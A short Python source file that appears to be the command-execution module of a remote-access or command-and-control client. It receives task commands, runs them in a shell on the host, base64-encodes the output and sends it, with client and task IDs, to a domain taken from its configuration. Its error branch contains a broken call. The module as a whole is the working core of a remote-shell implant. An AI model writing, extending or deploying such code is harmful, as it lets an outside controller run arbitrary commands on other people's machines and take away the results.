import subprocess
import base64
import urllib

from config.config import config
from requestMethods.requestMethods import *
from helpers.helpers import *

class CMDExecutor:

	def __init__(self, stateInstance):
		self.stateInstance = stateInstance
		self.name = 'cmdexecutor'

	def run(self, clientId, task):
		self.executeCMD(clientId, task)

	def sendResult(self, client_id, task_id, result):

		_data = urllib.parse.urlencode([
			('client_id', client_id),
			('task_id', task_id),
			('date', getCurrentDateTime()),
			('type', 'cmd-request'),
			('result', base64.b64encode(result).decode('utf-8'))
		]).encode("utf-8")


		sendRequest(config['domains'][0], _data)

		
	def executeCMD(self, clientId, task):
		try:
			_result = subprocess.run(task['command'], shell=True, capture_output=True)
			self.sendResult(clientId, task['task_id'], _result.stdout)
		except Exception as e:
			self.sendResult(clientId, task['task_id'], e.message())

		print('CMDExecutor is running...')